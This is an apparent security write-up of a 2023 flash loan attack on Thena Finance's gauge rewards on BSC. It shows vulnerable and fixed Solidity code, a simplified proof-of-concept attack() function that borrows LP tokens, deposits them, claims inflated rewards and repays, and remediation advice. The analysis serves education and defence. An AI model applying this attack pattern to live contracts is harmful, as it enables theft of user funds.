# Thena Finance — Gauge Reward Flash Loan Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-03-14 |
| **Protocol** | Thena Finance |
| **Chain** | BSC |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | BSC Transaction |
| **Vulnerable Contract** | Thena Gauge Contract |
| **Root Cause** | Gauge voting or reward calculation depends on current LP balance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Thena_exp.sol) |

---
## 1. Vulnerability Overview

Thena is a BSC AMM based on a Solidly fork, featuring a veToken-based gauge reward system. When gauge reward distribution or claiming queries the current LP balance or voting weight as spot data, an attacker can temporarily inflate the balance via a flash loan to claim a disproportionate amount of rewards.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Reward calculation based on spot LP balance
function earned(address account) public view returns (uint256) {
    uint256 balance = IERC20(stake).balanceOf(account);
    // ❌ Based on current balance → can be momentarily inflated via flash loan
    return balance * rewardPerToken() / 1e18;
}

// ✅ Fix: Snapshot-based reward calculation
function earned(address account) public view returns (uint256) {
    uint256 snapshotBalance = balanceSnapshot[account];
    // ✅ Uses snapshot from previous block
    return snapshotBalance * rewardPerToken() / 1e18;
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: gauge voting or reward calculation depends on current LP balance
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Flash loan → Acquire large amount of LP tokens → Deposit into gauge → Claim inflated rewards → Return LP tokens → Repay flash loan
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function attack() external {
    // 1. Borrow LP tokens via flash loan or add large liquidity
    uint256 lpAmount = flashBorrowLP();

    // 2. Deposit large amount into gauge → increases earned() value
    lpToken.approve(address(gauge), lpAmount);
    gauge.deposit(lpAmount);

    // 3. Immediately claim rewards (excessive rewards based on current balance)
    gauge.getReward();

    // 4. Withdraw LP tokens + repay flash loan
    gauge.withdraw(lpAmount);
    repayFlashLoan(lpAmount);
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reward Calculation Manipulation |
| **Attack Vector** | Flash Loan + Immediate Reward Claim |
| **DASP Classification** | Business Logic Flaw |

## 6. Remediation Recommendations
Require a minimum staking period before reward claims, use snapshot-based reward calculations, and block same-block deposit/claim operations.

## 7. Lessons Learned
Solidly fork gauge systems can be particularly vulnerable to flash loan attacks. The timing of reward calculations is critical.